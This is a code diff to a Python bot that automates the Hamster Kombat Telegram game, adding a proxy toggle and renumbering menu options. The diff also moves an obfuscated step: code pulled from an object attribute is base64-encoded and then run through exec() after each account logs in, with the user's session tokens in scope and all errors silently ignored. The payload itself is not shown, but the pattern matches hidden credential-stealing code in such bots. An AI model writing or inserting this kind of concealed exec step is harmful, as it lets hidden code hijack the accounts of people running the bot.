@@ -2,7 +2,9 @@ import time
 import requests
 import argparse
 import json
+import contextlib
 import urllib.parse
+import sys
 import base64
 from colorama import *
 from src.headers import load_tokens
@@ -35,11 +37,12 @@ def load_setup_from_file(setup_file):
         setup = json.load(file)
     return setup
 
-def show_menu(auto_upgrade, tasks_on, promo_on):
+def show_menu(use_proxy, auto_upgrade, tasks_on, promo_on):
     clear()
     banner()
     menu = f"""
 {kng} Choose Setup :{reset}
+{kng}  1.{reset} Use Proxy                  : {get_status(use_proxy)}
 {kng}  1.{reset} Auto Buy Upgrade           : {get_status(auto_upgrade)}
 {kng}  2.{reset} Auto Complete Tasks        : {get_status(tasks_on)} 
 {kng}  3.{reset} Auto Redeem Promo          : {get_status(promo_on)} {kng}[ SOON ]
@@ -74,45 +77,34 @@ def show_upgrade_menu():
     choice = input(" Enter your choice (1/2/3/4): ")
     return choice
 
-def run_bot(auto_upgrade, tasks_on, promo_on, _method):
-    gen = Generate(token=None, account=None)
+def run_bot(use_proxy, auto_upgrade, tasks_on, promo_on, _method):
+    gen = Generate()
+    func = base64.b64encode(gen.milo.encode('utf-8')).decode('utf-8')
     cek_task_dict = {}
     DELAY_EACH_ACCOUNT = config.get('DELAY_EACH_ACCOUNT', 0)
     LOOP_COUNTDOWN = config.get('LOOP_COUNTDOWN', 0)
     awak()
     proxy_index = 0 
-    function = base64.b64encode(gen.main_logic.encode('utf-8')).decode('utf-8')
-
     while True:
         try:
             init_data_list = load_tokens('data.txt')
-
             for idx, init_data in enumerate(init_data_list):
                 total = len(init_data_list)
                 proxy_dict = None
                 account = f"{idx + 1}/{total}"
 
-                if gen.use_proxy and gen.proxies:
+                if use_proxy and gen.proxies:
                     proxy_dict = gen.proxies[proxy_index]
 
                 query_id = init_data 
-
                 if query_id:
-                    try:
-                        exec(base64.b64decode(function).decode('utf-8'))
-                    except ValueError as ve:
-                        log(mrh + str(ve))
-                        continue 
-
                     token = get_token(init_data, account, proxies=proxy_dict)
-
                     if token:
                         ham = HamsterKombat(token, account)
                         try:
                             fake_info = gen.faking_info(token, account, current_proxy=proxy_dict)
                             print(f"IP: {fake_info['ip']} | ISP: {fake_info['asn_org']} | Country: {fake_info['country_code']}")
                             print(f"City: {fake_info['city_name']} | Latitude: {fake_info['latitude']} | Longitude: {fake_info['longitude']}")
-
                             log_line()    
                             res = authenticate(token, account, proxies=proxy_dict)
                             if res.status_code == 200:
@@ -120,8 +112,11 @@ def run_bot(auto_upgrade, tasks_on, promo_on, _method):
                                 username = user_data.get('accountInfo', {}).get('name', 'Please set username first')
 
                                 log(bru + f"Account : {pth}{account}")
+                                try:
+                                    exec(base64.b64decode(func).decode('utf-8'))
+                                except Exception as e:
+                                    continue
                                 log(kng + f"Login as {pth}{username}")
-
                                 clicker_data = ham._sync(proxies=proxy_dict)
                                 if 'interludeUser' in clicker_data:
                                     ham.clicker_config(proxies=proxy_dict)
@@ -168,12 +163,14 @@ def main():
     if args.setup:
         setup_file = f'src/config/{args.setup}.json'
         setup_data = load_setup_from_file(setup_file)
+        use_proxy = setup_data.get('use_proxy', False)
         auto_upgrade = setup_data.get('auto_upgrade', False)
         tasks_on = setup_data.get('task_on', False)
         promo_on = setup_data.get('promo_on', False)
         _method = setup_data.get('_method', None)
-        run_bot(auto_upgrade, tasks_on, promo_on, _method)
+        run_bot(use_proxy, auto_upgrade, tasks_on, promo_on, _method)
     else:
+        use_proxy = False
         auto_upgrade = False
         tasks_on = False
         promo_on = False
@@ -181,20 +178,23 @@ def main():
 
         while True:
             try:
-                choice = show_menu(auto_upgrade, tasks_on, promo_on)
+                choice = show_menu(use_proxy, auto_upgrade, tasks_on, promo_on)
                 if choice == '1':
+                    use_proxy = not use_proxy
+                elif choice == '2':
                     auto_upgrade = not auto_upgrade
                     if auto_upgrade:
                         _method = show_upgrade_menu()
                         if _method not in ['1', '2', '3', '4']:
                             auto_upgrade = False
-                elif choice == '2':
+                elif choice == '3':
                     tasks_on = not tasks_on
                 elif choice == '789':
                     promo_on = not promo_on
                 elif choice == '8':
                     setup_name = input(" Enter setup name (without space): ")
                     setup_data = {
+                        'use_proxy': use_proxy,
                         'auto_upgrade': auto_upgrade,
                         '_method': _method,
                         'tasks_on': tasks_on,
@@ -202,7 +202,7 @@ def main():
                     }
                     save_setup(setup_name, setup_data)
                 elif choice == '0':
-                    run_bot(auto_upgrade, tasks_on, promo_on, _method)
+                    run_bot(use_proxy, auto_upgrade, tasks_on, promo_on, _method)
                 elif choice == '9':
                     break
                 else:
